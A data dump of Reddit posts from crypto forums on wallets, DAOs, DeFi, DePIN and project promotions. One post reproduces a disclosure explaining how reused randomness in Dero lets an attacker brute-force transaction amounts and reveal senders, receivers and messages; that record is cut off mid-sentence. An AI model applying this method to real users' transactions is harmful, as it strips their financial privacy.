Non-Crypto Trader with a question,"i am not a crypto trader. i do have a friend who is, though it's not a close acquaintance. they said if i wanted to try, i could download trust wallet, coinbase wallet, then send them my ethereum address from in coinbase wallet, fund my account through trust wallet, and they would use my ethereum address to ""synchronize"" our accounts so that whatever trades they made, i would make automatically with whatever money i wanted to put in. (say, 500 bucks for instance). to me, this sounds extremely shady. they aren't explaining how they would sync our accounts, what method/program they use, etc. however, the average online search says sending someone an ethereum address is generally safe. i just don't see how they could use that sole information to do what they're saying. if so, by what method? i initially saw this as a harmless way to have a glimpse into what trading in crypto is like. but now i'm starting to feel as if there is a method of phishing/scamming of which i'm not aware, and i don't want anyone with access to my personal/financial information for obvious reasons. if someone could explain to me how this works in layman's terms (eli5) or whether this is a setup to grift money and/or personal info, i'd appreciate it! they're very annoyed by all my questions, which is part of why i'm so skeptical. seems like there would be no reason to hide what they're doing or how if it was safe and legitimate. anyway, let me know what i'm missing, if anything. or confirm what my gut says -- that this isn't a real thing, and someone is trying to see if they found a new mark. edit: thanks for the helpful (and expected) responses! like i said, i was never planning on getting into crypto regardless. just not my bag, personally. i just wanted to learn about it, the equivalent of bringing $50 to vegas but otherwise just seeing the sights. i appreciate the responses, because i have a more coherent way to say ""nah"" without making the overall social situation as awkward if anyone asks why i pissed this individual off. appreciate the help!",16,15,0.94,2024-11-08 17:43:30,web3,ethereum,writingincorners,False,25.0

ITO Crowdfunding for Artists,"itos (similar to icos) have been one of the most successful use cases of blockchain technology to date. they allow for a very low barrier to entry for supporters and fans that want to help fund a project they believe in and receive equity. imusify leverages this technology to help artists crowdfund for projects like albums, music videos, and tours. in addition, these tokens can also be programmed as what are called “private access tokens”. these token allow holders to access exclusive content provided by the artist, which can be anything ranging from discounted ticket prices to private chat access with the artist. these tokens can also be traded on an exchange within the imusify platform for other artists’ tokens, or the platform’s utility token, imu. this feature will greatly benefit up-and-coming artists that have a lot of talent but lack the funds and resources they need to develop and get started on what they need to become successful. to learn more on imusify and the numerous benefits it has in store for artists, feel free to check out https://imusify.com/",29,0,0.75,2018-09-26 18:12:18,web3,BlockchainStartups,gwen_sarah1,False,24.9
"Call out for compute, lets break records together!","over the past couple of years, i've been working away on a research network called cassie which will lay the groundwork for the radix network upgrade, xian. cassie exhibits a number of novel and interesting properties which have undergone peer review, but simply the core goals were to implement a linearly scalable consensus protocol which also retains high decentralization and security metrics. linearly scalable in this context means that if the compute (validators) available to the network doubles, then the maximum throughput of the network also doubles. this has been tested extensively, both in the ""lab"" and with members of the radix community participating in the tests and we have achieved great results so far sustaining 120,000 transactions per second (about 50% being complex smart contract calls such as swaps) and consumed bursts of 160,000+ without issue. our plan over the next few months is to run a series of tests with a goal to exceed 1,000,000 transactions per second for sustained periods of time. this will require significant compute hence my call out across crypto in general for participation. we could of course simply rent compute from the various cloud providers and do the test ourselves, but my desire here is for these tests to be as representative of main-net performance as possible. that requires that we (radix) should run a minimal amount of validators to bootstrap the network and the rest provided by 3rd-parties. the validators would then be globally distributed, different hardware configurations & isps (we've had some guys use starlink successfully at high load!) and behave akin to a main-net in the wild (minus the value of course). too often these ""tests"" are performed in a ""lab"" environment, totally under the control of the project stakeholders, run for short durations typically minutes, very simple transactions such as a->b transfers, high specification hardware, super fast connection & low numbers of validators. in some cases, critical elements have been disabled such as signature generation & validation in order to push the numbers. these results are then paraded as if they are some kind of achievement, but upon main-net launch the performance capability is a fraction of what these tests achieved. it is disingenuous, dishonest & unhealthy, distracting from legitimate projects who are working hard on real scalability solutions. we want to do it right! if you'd like to participate, please dm. you will need a machine with the minimum specification of 4 core, 8gb, 200gb sata ssd & 20mbps/50mbps. if you have better specification hardware then you could run multiple validators on the same instance. also interested in any suggestions to ensure these tests as are real world representative as they can be. thanks in advance, and i look forward to busting some records with you all!",22,7,0.89,2024-05-09 06:22:27,web3,CryptoTechnology,fuserleer,False,24.9

Can Quantum Computers Affect Blockchain,"quantum computing is real and it pose a significant threat to traditional encryption methods, rendering many security protocols obsolete. encryption relies on mathematical problems that are difficult for classical computers to solve. however, quantum computers can tackle these problems with ease through algorithms like shor's algorithm, which breaks rsa and ecc encryption. this breakthrough in computational power raises concerns for all sectors, especially tech companies handling sensitive data. from financial institutions to government agencies, the ramifications of quantum computing on security are profound and far-reaching. layer 1 blockchains like bitcoin and ethereum, are particularly vulnerable. their security relies heavily on cryptographic algorithms that quantum computers can crack, compromising the integrity of transactions. blockchain's promise of decentralization and immutability could be at stake if quantum adversaries exploit vulnerabilities in current encryption schemes. transactions, identities, and smart contracts could be compromised, leading to widespread distrust in blockchain systems. it's crucial for tech companies, especially those in the blockchain space, to proactively address the quantum threat. transitioning to quantum-resistant cryptographic algorithms is paramount to safeguarding sensitive data and maintaining trust in digital infrastructures. fortunately, research into quantum-resistant cryptography is underway. post-quantum cryptographic algorithms like lattice-based cryptography offer promising solutions that can withstand attacks from both classical and quantum computers. by integrating quantum-resistant cryptography into their systems, tech companies can future-proof their security measures against the looming threat of quantum computing. this proactive approach is essential in ensuring the resilience of digital ecosystems. the question is: what blockchain do you think is already preparing against the quantum computer threat? i believe it might be wise to look into such",13,17,1.0,2024-04-03 07:33:10,web3,BlockchainStartups,BlueLatenq,False,24.6

web3.0,"leaders in the web3 field gathered at the world economic forum in davos to discuss the first results of the ""define and build the metacomes"" initiative. over the past year, the metaverse has been a buzzword in and around the web3 world. in addition, relative to the overall turmoil in the decentralized field, the development of the metaverse remains strong. &#x200b; the metaverse is also a hot topic at the 2023 world economic forum (wef) in davos, switzerland. the world economic forum has been working on its own initiative, ""defining and building the metaverse,"" with more than 120 participants, for which it held a press conference on january 18. &#x200b; the wef expert discussion panel highlighted the initiative's first two documents, covering interoperability, governance and the role of consumers in the future meta-universe. &#x200b; huda al hashimi, one of the panelists and the united arab emirates' undersecretary of cabinet affairs for strategic affairs, described the future of the metaverse as an area that breaks down social barriers and does not repeat past mistakes. &#x200b; ""we have to ask ourselves why we are still stuck in the areas we want to break through. we believe that a breakthrough will happen."" &#x200b; especially when it comes to government agencies creating their own presence in a digital reality, hashimi said the initiative's vision reimagines the role of regulators. &#x200b; ""we also see that regulators will be more like referees than gatekeepers. that code of conduct would actually take precedence over making policy."" &#x200b; across the globe, governments are exploring the meta-universe. the uae has launched a government-backed meta-universe city in the country as one of its many initiatives in the field of digital reality. &#x200b; norwegian government departments have also opened metaverse branches to meet the needs of a new generation of users. &#x200b; cathay li, director of shaping the future of media, entertainment & sport and a member of the executive committee of the world economic forum in geneva, said that for digital reality to benefit users, regulation and value creation are two key issues to understand. &#x200b; ""there is huge economic and social value in this. but if it's not regulated, there could be privacy, safety and security issues."" &#x200b; cathay li said that the meta-universe should not be seen as the ""end state"" of all the work and developments currently taking place. instead, it should be seen as a ""continuous digital transformation"" of human experience in digital reality. &#x200b; in addition to governance ideas, panelists also talked about interoperability and user data generation in the meta-universe. &#x200b; siu yat, co-founder and executive chairman of animoca brands, pointed out that digital property rights are the key to the interoperability needed for the next evolution of the meta-universe. he says: &#x200b; ""if you don't have judicial property, then you can actually have digital freedom - the freedom to transact, because it's always allowed."" i think that's the foundation for making interoperability work for everyone."" &#x200b; all three panelists have a five-year vision for a metaverse that is more deeply integrated into the daily lives of most people, while having a clearer governance structure. ""the meta-universe is going to be a part of our lives whether we like it or not,"" hashimi said. &#x200b; yat concluded by emphasizing that in the near future, the meta-universe will also generate new economies, which may be on a national scale. &#x200b; ""the new national economy will emerge from the meta-universe like a virtual society that is real because all the transaction value and all the commercial activity will take place on it."" &#x200b; in particular, he stressed that with stronger digital assets, users will be able to really benefit in these new digital economies. recently, mckinsey reported that the metaverse has the potential to create $5 trillion in value over the next seven years.",13,18,0.94,2023-06-16 02:31:55,web3,CryptoTechnology,PuzzleheadedVideo831,False,24.4

Top Projects that Reward Customers for Using Their Data,"the questions of when and what data should be shared to whom and how the data owner should get credit or incentive to share their data are increasingly a matter of intense debate and research. user data is collected by different parties, for example, companies offering apps, social networking sites, and others, whose primary motive is to have enhanced business model while giving optimal services to their customers. however, the collection of user data is associated with serious privacy issues. here are some projects using blockchain technology that let you be in control of your data and also reward you for the same: 1. **tapmydata**: the tapmydata solution is a framework of tools, ledger and decentralized protocol for people to reclaim their digital identity, crystallize unique, verified elements of consent in an nft and provide a new, transparent channel for legitimate counterparties to blend data and exchange value. their mission is to give people control of their data and leverage collective agency in how it’s used, whether to share or get their piece of a market worth $325bn annually. 2. **streamr**: streamr (data) is an open source project and decentralized platform that relies on cryptography instead of trust. it is a p2p, real-time data infrastructure that houses a platform and tools for a new data economy. the technology stack includes a scalable real-time messaging network (pub/sub) hosted on computers worldwide, a marketplace for trading/selling data and a set of tools for working with real-time data. 3. **vetri global**: vetri is a blockchain-enabled personal data management platform putting the user back in control. they're a non-profit foundation whose mission is to make sure people earn the full value for their opinions. 4. **doortoken**: door is the first lead exchange powered by crypto to reward consumers. door rewards consumers every time advertisers access their data. door removes the middleman and enables a direct connection between consumers and businesses. door brings value to both the consumer and the advertiser. with door the transition of power can be put back into the consumer’s hands. consumers get paid to connect with products and services they want to buy - and the advertiser can directly connect with potential customers at a competitive price. 5. **geodb**: geodb describes itself as a decentralized peer-to-peer big data sharing ecosystem, which aims to return value to its creators and users. geodb’s mission is to democratize the 260b big data industry and build an open ecosystem to establish better and trusted relationships between market participants while giving back control and value to data generators, the users. geodb aims to use blockchain technology to eliminate intermediation in a huge industry and drive a faster growth an adoption. what are some of the other similar platforms you've come across?",23,2,0.97,2021-09-25 04:30:11,web3,BlockchainStartups,PatriciaHarris_,False,24.299999999999997

"Crypto will only work if,","crypto currency will only work if, we become completely globalized and convert all existing money into one pre determined coin that no one can buy before hand. if we allow the technology to be securitized it can't work, because if we for example end up using bitcoin as the holy currency, a market will be created where people who own the coin before we convert to 100% usage of solely that coin, end up with lots of quantity and can demand higher and higher prices for 1 bitcoin. a billionaire who buys bitcoin and is in the last 1% of bitcoin adopters could end up paying 1 billion dollars for 1 coin. if there truly ever is a conversion from fiat money to a single coin, those fiat currencies that are now the most valuable currencies will have less and less demand and usage as we convert from fiat to a securitized coin currency, making it even more expense for a wealthy late converter to recieve the true past value of his assets. assets value could end up changing when depending on if you adoprt the currency earlier or later if you are early you could get 100,000 noticing for your house but if not then those who control majority of bitcoin can abuse you for not having anything else to offer and give you 1 coin if they want.where as someone who owns some of the coin right now could have a real technical value of 250,00$ at present, in the future there wealth becomes far greater just for having bouht more coins then someone and from buying the lucky coin amongst thousands of coins earlier than everyone else become wealthier than those who didn't. rich people who own most of the value in the world would also not let this happen and they have huge political influence in every country in the world, and to have one single coin you have to be globalized so countries would make it 100% illegal for that to happen before it started. and those who own the god coin will have zero use and will have a coin who's value is stored in its trading capabilities could become valueless.",0,48,0.5,2023-07-27 18:37:34,web3,CryptoTechnology,salomander19,False,24.200000000000003

Regarding Verified Credentials (VCs) - The Issuer Trust Concern,"wondering if anyone can offer some insights into the challenge of trusting some issuers. anyone a bit deep into this area knows about the triangle... issuers, holders, verifiers. (i'm leaving out 'controllers' for now; for example, parents of kids or others who control a did.) part of the whole point here is once i'm issued a vc, (let's say by my university for a diploma), a verifier doesn't have to talk to an issuer because my vc is cryptographically signed by the issuer. great. but how does the verifier confirm the issuer is legit? i could ask my programming buddy bob to pretend to be my university and the vc he issues me will pass cryptographically. now, businesses over time will likely get themselves verified legal entity identifers from gleif, so a verifier, (if they know about this standard), might check for that for business entities. and, there is a standard for trust registries. (the folks at trinsic talk about this.) however, unless a verifer is sophisticated and looking at such things, or the issuer puts these name/value pairs in the json file of the did, how can a verifier really know the credential is legit? the technical structure of the crypto and the triangle of holder/issuer/verifier makes perfect sense. but if part of the point is decentralization, how do you ever really get away from centralization if you really need a trust registry, (for root of trust validation), of issuer entities being legit? won't verifiers need some means to understand - via some centralized entity; either government or industry org - that an issuer is legit? what am i missing here? thanks.",9,22,1.0,2023-07-14 09:20:16,web3,CryptoTechnology,ScottyRed,False,24.2

Will DeFi Stand Out in 2024? A Glimpse into the Future of Decentralized Finance,"as the world steps into 2024, the buzz around decentralized finance (defi) continues to grow. emerging from the shadows of traditional finance, defi promises a more open, accessible, and transparent financial system. but the question remains: will defi stand out in 2024? the promise of defi is undeniably revolutionary. by leveraging blockchain technology, it offers a financial system where services like lending, borrowing, and trading are accessible to anyone with an internet connection, free from the constraints of traditional banking institutions. this democratization of finance could empower millions, particularly in regions with limited access to banking services. however, the journey of defi is not without its challenges. regulatory uncertainty has been a significant hurdle. governments around the world are grappling with how to regulate this new financial landscape without stifling innovation. as 2024 progresses, the hope is that clearer regulations will emerge, providing a safer environment for both investors and developers. another critical aspect is the issue of scalability and transaction costs. platforms like ethereum, which host a significant portion of defi applications, have faced challenges like high gas fees and network congestion. solutions like ethereum 2.0, layer 2 scaling solutions, and alternative blockchains are being developed to address these issues. if successful, these solutions could significantly enhance the user experience and adoption. moreover, the integration of ai and machine learning in defi cannot be overlooked. these technologies could lead to smarter, more efficient financial services, further propelling the appeal of defi. security remains a paramount concern. the defi sector has witnessed several high-profile hacks and scams. strengthening security protocols and educating users about safe practices will be crucial for defi's sustainability and growth. in conclusion, while defi is positioned to revolutionize the financial sector, its success in 2024 will largely depend on how it navigates regulatory landscapes, solves scalability and security challenges, and continues to innovate. if these challenges are met, defi could indeed stand out as a beacon of modern, inclusive finance.",14,13,1.0,2024-01-29 09:14:27,web3,defi,blockchainsoldier01,False,23.6

Ferrum Network - A Viable Solution for Lack of Blockchain Interoperability,"blockchain has been touted as the next big thing in the world of technology with the hosts of benefits outlined from the deployment of the infrastructure in private and public settings. this explains the reason why we have so many blockchains today, each with its specific use case. despite the continued addition of new projects, issues such as low latency, privacy concerns for public chains, limited real-world application case, and lack of interoperability have continued to deprive the technology widespread adoption. the stark truth is that blockchain is yet to fully deliver its promises. there are only a couple of projects that are actively working to solve these problems once and for all. ferrum is one of such. ferrum network solution ferrum network is a robust high-speed high performance infrastructure based on dag architecture that facilitates cross-chain communications between different blockchains and dag-based networks for the exchange of digital assets, thereby eliminating third-party intermediaries. the ferrum network is designed to support crypto-financial transactions between networks which hitherto have been standing in isolation and ignorance of the existence of other chains via a host of financial decentralized applications (dapps) built on the platform. with unifyre wallet, users can safely exchange one cryptocurrency for another, say eth for btc, in a peer-to-peer manner that does not involve sending funds to centralized exchanges (intermediaries). the wallet is non-custodial, meaning that users control their private keys and do not need to send tokens to execute the exchange. the ferrum network automates the entire process and implements the transaction through a proxy token called fe, which is backed by real asset on the external network. other products developed on the ferrum network are kudi exchange (p2p fiat-to-crypto decentralized exchange for the nigerian crypto community), infinity dex (a centralized exchange), and the sub-zero advanced security cold-storage wallet. all these financial applications are built on the ferrum network and therefore provide real use cases for the infrastructure. conclusion scalability and lack of interoperability issues inherent in existing blockchain solutions may soon become a thing of the past when ferrum network is fully launched. for more information on how ferrum network intends to engineer these solutions, use these links: website: https://ferrum.network whitepaper: http://whitepaper.ferrum.network/ author's bounty0x username: mexite",23,0,0.93,2019-05-13 08:53:09,web3,BlockchainStartups,Mexite,False,23.1

Is anyone else super excited about DePIN in the Web3 space?,"hey everyone! 👋 i’ve been diving deep into depin lately, and i’m curious—what’s everyone’s take on this from a web3 perspective? it feels like this is exactly the kind of innovation we’ve been waiting for. we’ve already seen web3 redefine how we think about ownership and governance online, but depin is taking those concepts into the physical world. imagine having decentralized control over the infrastructure we use every day—things like roads, networks, and data—without the usual centralized entities making all the decisions. what’s really exciting is that many of these projects are open to everyone, so getting involved early is low-risk. you can contribute, help shape the future of this space, and potentially earn some rewards along the way. it’s a true web3 approach—collaborative, community-driven, and empowering. here are a few projects in the depin space that have me particularly excited: helium: you might already be familiar with helium, but it’s worth mentioning again. they’re building a decentralized wireless network for iot devices, and you can set up a hotspot to support the network and earn rewards. this feels like it could become a core piece of our web3 infrastructure. mapmetris: this one really caught my eye. it’s like a decentralized version of waze, where you contribute traffic data and actually get rewarded for your participation. solencio: noise pollution is a big issue, and solencio is tackling it with a decentralized network of noise monitors. finally, communities have a way to influence and improve their own environments. so, what do you all think? am i getting ahead of myself, or is depin poised to be a major player in the web3 space?",13,15,0.89,2024-08-19 12:43:55,web3,web3,Sad-Region9981,False,22.700000000000003

What are DAOs?: Everything you need to know About DAOs,"before i start, you can read this article here and earn 5 dao tokens: [https://www.voicedao.fun/everything-you-need-to-know-about-daos](https://www.voicedao.fun/everything-you-need-to-know-about-daos) (no sign up needed) &#x200b; d a o the 3 letters every web3bro can’t stop saying but what are daos? are daos what they claim to be? why should you join one? we cover that and more in this article: everything you need to know about daos. lets start with **what are daos?** daos are decentralized autonomous organizations, already thats a mouth full but give me a minute, daos happen when a group of people with a common goal, mission and vision come together to achieve it in a decentralized way. we removed as many buzzwords as possible. a common meme definition is a group chat with a shared crypto wallet. imagine you are a drake fan, which we expect you to be, then you gather you and a bunch of friends who are also die hards together and say the goal of this dao is to have at least one member of the dao in every drake show no matter where in the world it is. so you create some form of chat and decide to pull together your crypto resources to fund every trip. you build the site in public and do everything transparently and everyone has the right to vote for who gets to represent the dao in every show based on the amount contributed. in its simplest and most basic form this is a dao. yes it can get complicated and instead of going to shows you’re investing in protocols and need lawyers in the dao, dev , designers, a balanced governance model and a lot more other things. **“the whole phrase is a misnomer. they’re not decentralized, not autonomous and they are not organizations,” monsterplay blockchain consultancy founder david freuden tells magazine.** now you must be wondering, why are they called daos if they aren’t what the full meaning is? the initial idea of what a dao is supposed to be is completely different from what it is today. the vision for daos was for it to be actually decentralized, no boss, autonomous, run by code, organization, a perfectly flat organization. the common narrative then was the uber narrative which was: the uber cars are drive by ai and the entire process involved no humans, apart from passengers of course, you pay with crypto which goes through the smart contract then sends the crypto to the contract wallet. basically a self driving uber with no employees but this narrative quickly changed when the first ever dao was formed. the name? the dao. the dao was supposed to be an investment dao investing in web3 native projects but it failed after it was hacked and had its treasury stolen and was also being attacked by the sec tagging the tokens a security. why daos should not be **decentralized autonomous organizations** this sounds very much counter intuitive as its right in the name of daos to be daos, but hear me out. **decentralized** we aren’t saying daos shouldn’t aim for decentralization, they should but a perfectly decentralized dao would barely get anything done. imagine being in a dao with 100 designers and the task is to design a logo. 100 people from 100 different backgrounds designing would definitely lead to 100 different ideas with everyone wanting their ideas to be heard, what would take a few designers 2 hours could take the collective a day. a solution around this is to break the team into bits and delegate tasks but at that moment it isn’t “perfectly fat” because processes need to be added which by all means is the best route for daos. a 80% to 90% decentralized system and a 10% to 20% centralized system, seems to be the perfect balance. **autonomous** no dao should really never aim to be autonomous. why? in its current form daos are about community once it becomes an autonomous organization we loose that and become a collective of code. autonomous processes are nice like having a bot classify different new members into guilds is a perfect use of autonomy but anything more and we are losing the dao essence. **organizations** well to be honest they can choose to be organizations but community just sounds and feels better :) #### why should you join a dao? simply put ownership, freedom and working on what you love. daos are gateway to long term wealth where builders and value creators get rewarded and the others? are left to speculate. daos are even playing field for everyone where talent speaks volume and graduating from harvard doesn’t. the girl from a slump in nigeria has got an equivalent playing field as the dude who graduated from harvard as long as they both have a laptop, internet connection, a discord account and use [voice](https://voice.softr.app/). **equality!** ### daos have the ultimate working conditions! working/contributing to a dao is a mix of working, learning, networking, comfort and having fun its the “perfect” balance. imagine having the ability to contribute to both discord code base and googles code base, they aren’t competitors so there really shouldn’t be a problem, in the current web2 world you get fired in the web3 dao filled world you’re loved by both daos! you get the freedom to choose what you want to work on and what time. daos offer you with flexibility where you’re rewarded according to the value added over time spent. hope you enjoyed the post, check out voice for more educational content: [https://www.voicedao.fun/](https://www.voicedao.fun/) you can also earn tokens while learning about web3",13,15,0.88,2022-04-26 14:35:21,web3,web3,Mk_Makanaki,False,22.6

"Deanonymization of the Dero Network: Sender, Receiver, Amounts, and Messages","full thread: https://twitter.com/kayabanerve/status/1791485161013694565 just the technical writeup: https://gist.github.com/kayabanerve/b754e9ed9fa4cc2c607f38a83aa3df2a proof following challenge: https://twitter.com/techleaks24/status/1791512329722442045 copy of the full technical writeup: ### the dero protocol the protocol uses a pair of rings, one for the senders, one for the receivers, represented as a singular ring. with each transfer, a list of elgamal ciphertexts is provided for all accounts within the joint ring. this elgamal ciphertext is formed as `r * g, (r * k) + (a * g)`, where `r` is some randomness, `k` is the key for the account the ciphertext is for, and `a` is the amount. ### the dero wallet protocol dero offers an 'encrypted message' with every transaction. even if the user does not explicitly provide one, a message will exist (either with internally provided values or left empty). for the only defined type of message, the message is encoded as the index of the sender, a cbor-encoded object, and zero-padding. the message is encrypted with the chacha20 stream created by a key of `h(h(r * k) || k)` where `r` is some randomness and `k` is the key for the account the ciphertext is for. ### the issue dero reuses the randomness for the elgamal ciphertexts and the message encryption. this means, if the amount is 0, the second part of the elgamal ciphertext is the shared key and the message can be decrypted (also revealing the receiver, as the elgamal ciphertext used is for a specific receiver). if the amount isn't 0, one can subtract `1 * g` until the amount term has a 0 coefficient. when the message does decrypt, the amount of subtractions performed is the amount, breaking amount privacy. since the first byte of the message is the sender index, this also reveals the sender. in total, this compromises sender, amount, receiver, and message privacy. ### technical notes since the encryption isn't authenticated (as far as the author of this work can tell), we cannot explicitly know if a decryption is valid or invalid. practically, we can. the last 16 bytes of the message will be zeroes, with very high statistical probability, if the message doesn't fill those bytes and the decryption key is correct. a random decryption key should produce random noise there instead. if the message does fill those bytes, then it's a long stream of cbor for which it's unlikely to be valid once further bounds are added. dero encodes all keys with an additional byte for the type (forcing said byte to be one of a few options and the corresponding value to be of that type). while not a strict limitation, all pre-defined keys are one letter, potentialy practically offering the bound of keys being two-byte ascii (though that assumes no callers defined their own keys which are either non-ascii or longer than one letter). with only the certain additional bounds, a cbor object which takes up the entire space will match random noise approximately once out of every 2\*\*40 trials. it'd be sane to flag cbor objects which look incorrect (despite passing the trial), and if so, continue brute forcing (the sanest result being the likely one with drastically increasing probability as it appears saner, any result shorter than 129 bytes being effectively certain). in summary, the trial decryption algorithm is checking if the result is a valid sender index (less than the ring length, for one of the potential senders), checking there's a valid cbor object _with the certain additional bounds_, and finally checking the remaining bytes are all zeroes. distinctly, since there's a lack of authentication (other than setting the sender ring length to 1, its own issue in this context), it's presumed possible for a transaction's sender to claim to be someone else (impersonating them). this is a distinct vulnerability in the messaging protocol, at least as it's being advertised for usage (in place of existing encrypted messengers). the byte intended for the sender index was historically mistakenly used for the receiver index. this was only patched six months ago in https://github.com/deroproject/derohe/pull/147. accordingly, sender privacy specifically was only broken for transactions made with wallet software updated to include the patch. the amount does need to be brute forced. dero amounts take 41 bits (due to only using 5 decimals and a supply in the low tens of millions), and with the maximum joint ring size of 128 (leaving 64 receivers, or 2\*\*6 candidates), takes 47 bits of effort at most (which is quite feasible for computers). due to most transactions having smaller than larger amounts, most transactions can be cracked faster than the max time brute force, and statistical analysis could be used to prioritize certain receivers (reducing the average time for any algorithm which is even slightly more right than wrong). because this is an attack on the wallet protocol, it can decrypt any message (as the message is part of the wallet protocol). the recovery of the amount, receiver, and sender assume the transaction was made in accordance with the dero wallet protocol. theoretically, someone could have their own non-compliant dero wallet, which either could not have its privacy broken or could provide false readings (depending on if it was programmed to use distinct encryption keys in explicit preparation for a work such as this, making this vulnerability prior discovered). while no such wallets are known to the author of this to work, and are extremely unlikely to exist, that must be noted. ### disclosure timeline this issue was found on may 14th, with a proof of concept built the same day. the proof of concept will be released in a week (leaving those affected a bit of time to prepare, though this post is detailed enough to enable independent development of such tools in practice). it isn't optimized to the degree necessary to crack every single transaction on the network now (as it'd need to be rebuilt for gpus, or potentially ideally fpgas) yet suffices as a proof of concept. dero offers a 50,000 usd bug bounty for vulnerabilities which affect the financial integrity of the blockchain. it includes no details on how to disclose bugs however. the author anonymously reached out to the maintainer of the dero project (""captain dero"") over matrix to inquire if the bug bounty would still apply and to report their findings. due to: 1) not receiving a reply from the maintainer within two days (a fair time to have the initial message acknowledged, per the author's opinion and the opinion of a leading web3 security platform) 2) contacting a developer successfully who said ""whatever you're looking at is likely a misunderstanding on your part"" (with no context other than there being a critical privacy issue attempting to be disclosed), who then said to submit a pr with my ""proposal"" (despite it being a security disclosure?), and when emphasized the desire to privately disclose to the maintainer before going public, being told the options were to go public or simply wait until the maintainer gets around to it. when following up a day later to again attempt to cause a successful connection with the maintainer, noting the lack thereof thus far, ""then just disclose it, no need to harass me over it"" 3) deciding users should be made aware as soon as possible so they no longer expect privacy for what would inevitably not have privacy the author decided to publish this without achieving successful communication with the maintainer. while that does make these findings unconfirmed by the dero project, the proof of concept establishes the theory works. ### moving forward if such a vulnerability was found in signal, the author of this work would not be able to decrypt all sent messages on the network as they would not have access. by placing messages on a highly replicated ledger, it's trivial for any adversary to obtain the ciphertexts of any message ever sent. this means a wallet compromised years after use can still have all its messages read, and since dero doesn't use a post-quantum key exchange, any adversary with a discrete log oracle (such as one with a quantum computer) would eventually be able to decrypt all messages. highly replicated ledgers should not be used for storage of extremely sensitive information in general, even if encrypted. if such a ledger is used regardless, it should be in a forward-secret manner with only a bounded subset of messages being readable on compromise. the immediate fix for this specific issue is to use distinct randomness for the message encryption key. that alone does not fix the variety of issues with this design (when posited as a secure messaging protocol). for context on the difficulty of secure messaging protocols, please see https://eprint.iacr.org/2022/376 (a 94-page analysis of signal), signal's post-quantum protocol https://signal.org/docs/specifications/pqxdh/, the simplex documentation and specifications https://github.com/simplex-chat/simplexmq/blob/stable/protocol/overview-tjr.md (which argues themselves a notable improvement upon signal), and imessage's extensive work on contact key verification https://security.apple.com/blog/imessage-contact-key-verification. this is an extensive field of theory for a reason. the dero (wallet) protocol has largely been undocumented and without peer review. its proofs for a transfer use a bulletproofs inner-product at the end, yet the higher-level constructions aren't documented other than one or two incredibly vague comments, such as how they're forming 'one-out-of-many' proofs (which are an explicit thing and it's not contested that the intent of these proofs is to implement one. the question is which it intends to implement). hopefully, the dero developers start formalizing their protocol and develop better relations with the wider cryptographic community as to cause peer review and help prevent issues such as this in the future. to the members of the dero community, and people in general, the recommendation is to only use secure messengers which have a peer-reviewed protocol and foss clients, such as signal (with molly being the leading foss client). this same line of reasoning also applies to privacy protocols in general, including those which apply to financial transactions. for a private, verifiable protocol for financial transactions, please see monero or zcash orchard (the latter achieves stronger privacy in theory yet has only been deployed on a network which doesn't require all transactions be private). finally, the dero community frequently has very grandiose marketing which claims their technology the best. while it's understandable for fans of a project to believe their project is the best, every project has hard limits. with this effective full-loss of privacy (except for sender privacy on transactions made by wallet software older than ~6 months), may they hopefully acknowledge

P2P Call via WebRTC in a Decentralized Manner,"# requirements: 1. nat compatibility: if both peers are behind compatible nat types (unlike symmetric nat), they can establish a direct connection. 2. discover public address via stun server: allows peers to determine their public ip and port to attempt a direct connection. 3. signaling exchange: exchange sdp (media capabilities) and ice candidates (transport-related information). # stun server / nat compatibility without any trust assumptions, it is not possible for a peer to know its public address because you cannot create a communication protocol between two peers that can be validated. this is due to the characteristics of the network, such as packet loss, delays, and other issues. furthermore, this problem is analogous to the two generals problem, which highlights the difficulty of achieving certainty in communication over unreliable networks. the essence of this problem is that you cannot determine whether the other party has received the message you sent, except by assumption. in a decentralized environment, an entity with malicious behaviour can exploit the other peer if the incentivized protocol is based on optimistic assumptions, which encourage the client and server to send and receive messages. this is why a stun server, based on a trust assumption, is necessary in the system. its reliability is maintained through the project's tokenomics, which includes dao functionalities. if we have these trusted stun servers in the system, the clients are capable of deciding whether they are behind symmetric nat or not by sending requests to 2 different stun servers. if the received port is different, unfortunately, the peer is behind symmetric nat and it cannot make a direct connection with other peers behind nats. they should use a turn server(decentralized turn servers are future plans). besides nat compatibility, a given peer has just known its public address. # signaling exchange on the blockchain, there is a phonebook where user identifiers are linked to public keys. to initiate a call, the caller should create a request with the callee's identifier and an offer related to the call, which includes media capabilities and the public address. this offer is encoded with the callee's public key, so only the callee can decode it. it’s important to note that the offer contains minimal information, approximately 20 bytes, not the full sdp. the callee must be reachable at the time of the call, meaning they need to have an internet connection to actively poll for events related to their user. once the callee receives the offer, they prepare an answer, which is shared on the blockchain, and then initiate the media stream to the address specified in the offer. after receiving the answer, the caller starts the media stream to the address provided in the answer. finally, the call is established. # tokenomics stun servers are added to the trusted stun server list on the blockchain through a voting process. this ensures that only trusted stun nodes, which have staked enough tokens, are available to users. the voting is conducted using the token dao functionality. to incentivize the honest behaviour of stun servers, two approaches are possible, depending on the resource requirements for answering stun requests. the cost is theoretically minimal because several free stun servers are available on the internet(future research). 1. stun servers serve every request: during the creation of a call, both the caller and the callee must pay x tokens on the blockchain for each interaction. stun servers would benefit from this revenue. 2. stun servers only serve requests from clients with staked tokens: clients would stake tokens on a monthly basis, similar to a subscription. there would be no additional fees for creating and responding to calls, except for the blockchain transaction fee. # open questions 1. how open are people to paying a small amount, either monthly or per call, to ensure that they are speaking over a secure, encrypted line? 2. how much safer is this approach compared to using end-to-end encryption (e2ee) on platforms like facebook or tlegram or signal? 3. approximately what percentage of devices are behind symmetric nat? i am also designing a decentralized system where turn servers are incentivized to forward packets to recipients. servers with turn and stun functionalities in a decentralized network would be the best approach to addressing all p2p communication challenges.",18,6,0.93,2024-09-08 11:13:19,web3,CryptoTechnology,MrDenisPenis,False,22.5

